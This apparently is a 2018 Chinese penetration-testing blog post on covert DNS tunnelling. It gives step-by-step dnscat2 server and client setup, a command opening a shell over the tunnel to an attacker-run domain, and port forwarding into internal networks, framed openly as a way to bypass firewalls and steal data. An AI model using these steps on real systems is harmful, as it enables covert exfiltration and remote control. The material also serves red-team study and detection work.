@@ -1,0 +1,904 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0x00 前言当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。 其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。 但是防御这件事情，不能因噎废食，服务器不能因为有潜在">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用DNS Tunnel传输数据">
+<meta property="og:url" content="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/index.html">
+<meta property="og:site_name" content="Leticia&#39;s Blog">
+<meta property="og:description" content="0x00 前言当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。 其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。 但是防御这件事情，不能因噎废食，服务器不能因为有潜在">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true">
+<meta property="og:updated_time" content="2018-08-07T02:39:45.029Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用DNS Tunnel传输数据">
+<meta name="twitter:description" content="0x00 前言当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。 其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。 但是防御这件事情，不能因噎废食，服务器不能因为有潜在">
+<meta name="twitter:image" content="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/"/>
+
+
+
+
+
+  <title> 利用DNS Tunnel传输数据 | Leticia's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Leticia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">She will never see the day it blossoms,maybe.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                利用DNS Tunnel传输数据
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-07T10:37:51+08:00">
+                2018-08-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/07/利用DNS-Tunnel传输数据/" class="leancloud_visitors" data-flag-title="利用DNS Tunnel传输数据">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。</p>
+<p>其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。</p>
+<p>但是防御这件事情，不能因噎废食，服务器不能因为有潜在的风险就把所有的通道都限制掉，就比如服务器需要允许至少对一个服务器的DNS请求，在这个前提下，就有大牛想出通过DNS Tunnel外发数据，避过防火墙来外发数据。</p>
+<h2 id="0x01-DNS"><a href="#0x01-DNS" class="headerlink" title="0x01 DNS"></a>0x01 DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p>
+<h2 id="0x02-DNS-Tunnel"><a href="#0x02-DNS-Tunnel" class="headerlink" title="0x02 DNS Tunnel"></a>0x02 DNS Tunnel</h2><p>DNS Tunnel，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p>
+<p>DNS Tunnel可以分为直连和中继两种。</p>
+<p>直连也就是用目标服务器直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。</p>
+<p>中继是通过DNS迭代查询而实现的中继隧道，则更为隐秘，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。</p>
+<p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果需要解析的域名在Local DNS Server中已经有缓存时，Local DNS Server就不会转发数据包。所以在我们构造的请求中，每次查询的域名都是不一样的或者是已经是过期的。</p>
+<p>对DNS载荷的编码是DNS Tunnel的另一个核心技术。从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为 2roAUwBaCGRuc3R1bm5lbGluZwo.test.domain.com,其中2roAUwBaCGRuc3R1bm5lbGluZwo则是客户端传递给服务器的信息，这串字符解码后的信息便是dns tunnel。</p>
+<p>大多数场景下，内网的Client位于防火墙后，Server不可能发起连接。所以Client会定时向Server发送请求，保证二者之间的通信状态。</p>
+<h2 id="0x03-使用dnscat2工具实现"><a href="#0x03-使用dnscat2工具实现" class="headerlink" title="0x03 使用dnscat2工具实现"></a>0x03 使用dnscat2工具实现</h2><p>Dnscat2的定位是一个封装在DNS协议中加密的命令与控制(C&amp;C)信道。它同样是C/S架构，Client由c编写，server由ruby编写。Client位于感染主机，而Server位于权威域名服务器上，如果没有权威域名服务器，则可以采用直连模式。</p>
+<p>为了直接达到能拿出来用的效果，我就使用实际场景搭建了，应用于实际场景我们需要一台公网服务器、一个域名、还有dnscat2程序。</p>
+<p>公网服务器作为server端，我建议使用ubuntu或者高版本centos（低版本的centos会出现一些小问题，如果比较熟悉ruby和gem挺容易解决的，我这里使用ubuntu演示，没有太多经验的可以跟着我使用ubuntu来现尝试一下）</p>
+<p>server使用如下代码安装需要的环境，然后使用git下载dnscat2进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p>
+<p>出现几行绿色字体如下所示就代表安装完成了：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true" alt=""></p>
+<p>然后我们需要在域名解析服务器上这样伪造，设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置，打码部分是服务器ip地址。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true" alt=""></p>
+<p>client如果是linux，就使用git下载dnscat2源码，然后编译dnscat2/client文件夹中的c文件</p>
+<p>linux-client端部署代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p>
+<p>client如果是windows，就直接在这个网址（<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> ）下载win32.zip的dnascat2后解压就可以了</p>
+<p>至此，环境都部署完毕，就可以开始连接隧道了。我测试时使用ubuntu系统的公网服务器做server，用本机的kali做client。</p>
+<p>我们首先在server端开启隧道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br></pre></td></tr></table></figure></p>
+<p>将这个域名改成自己刚刚设置的ns记录的子域名，–no-cache代表不进行缓存</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true" alt=""></p>
+<p>然后将上面产生的这串secret复制下来，要在client中使用。</p>
+<p>client中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true" alt=""></p>
+<p>domain参数是我们ns记录的子域名，secret参数是刚才server中生成的密文，我们传输信息的安全程度就取决于它。windows中参数使用略有不同，自己查看help文件即可。</p>
+<p>client运行得到上面结果之后，server中也会出现一个new window create，后面是它的sessionID，我们现在就可以在server中通过这个session连接控制client了</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true" alt=""></p>
+<p>使用如下代码可以进去这个session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
+<p>然后使用help可以查看可以使用的命令：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true" alt=""></p>
+<p>比如我们要使用一个shell控制，可以输入shell获取一个新的window，sessionID为2，然后再session -i 2切入。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true" alt=""></p>
+<p>之后就可以使用命令交互：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true" alt=""></p>
+<p>此时我们也可以通过dns隧道来访问目标系统可以访问的网络，类似于ssl，在dnscat2中用listen命令实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen [lhost:]lport rhost:rport</span><br></pre></td></tr></table></figure></p>
+<p>比如我们要通过对方网络访问百度，那就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen 1234 www.baidu.com:80</span><br></pre></td></tr></table></figure></p>
+<p>访问localhost:1234就可以通过对方网络访问百度了，不过这个功能一般是用来访问内网才可以访问的网站，探测对方内网之后将baidu替换成对方内网的站就可以了。</p>
+<p>我们dns tunnel建立好之后，主要是为了绕过防火墙偷数据，使用help学习其他功能传输即可。</p>
+<h3 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h3><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true" alt=""></p>
+<p>在客户端中抓包可以看到，有很多DNS的TXT、CNAME、MX的查询方法，这是因为Dnscat2 利用的DNS请求类型默认是TXT,CNAME,MX随机混合使用，不过我们可以在运行时通过参数自定义来更改请求方式。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>用于dns tunnel的工具除了dnscat2(灵活)，还有dns2tcp(Kali直接集成了这个工具)、iodine(速度快)等，各有特点，我们可以根据实际情况来选取。</p>
+<p>还有要注意的一点是使用了dns tunnel只是绕过了一些传统防火墙，如果对方的防御系统具备一些基于机器学习或深度学习的检测策略，或者对方的安全人员比较熟悉这种偷数据的方式，还是会被发现的。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/03/C-C控制服务思路浅析/" rel="next" title="C&C控制服务思路浅析">
+                <i class="fa fa-chevron-left"></i> C&C控制服务思路浅析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="麻薯" />
+          <p class="site-author-name" itemprop="name">麻薯</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">80</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+		
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-DNS"><span class="nav-number">2.</span> <span class="nav-text">0x01 DNS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-DNS-Tunnel"><span class="nav-number">3.</span> <span class="nav-text">0x02 DNS Tunnel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-使用dnscat2工具实现"><span class="nav-number">4.</span> <span class="nav-text">0x03 使用dnscat2工具实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#抓包观察"><span class="nav-number">4.1.</span> <span class="nav-text">抓包观察</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">5.</span> <span class="nav-text">0x04 总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">麻薯</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("GWhcWVw7VpoLTRfaQ2D1q3fj-gzGzoHsz", "4eb8jdrkQzBrcf7sJImJdOPd");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  <a href="https://github.com/echohun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/567c3a48d796e2fc06ea80409cc9dd82bf714434/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f6461726b626c75655f3132313632312e706e67" alt="fork me on github" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png"></a>
+</body>
+</html>
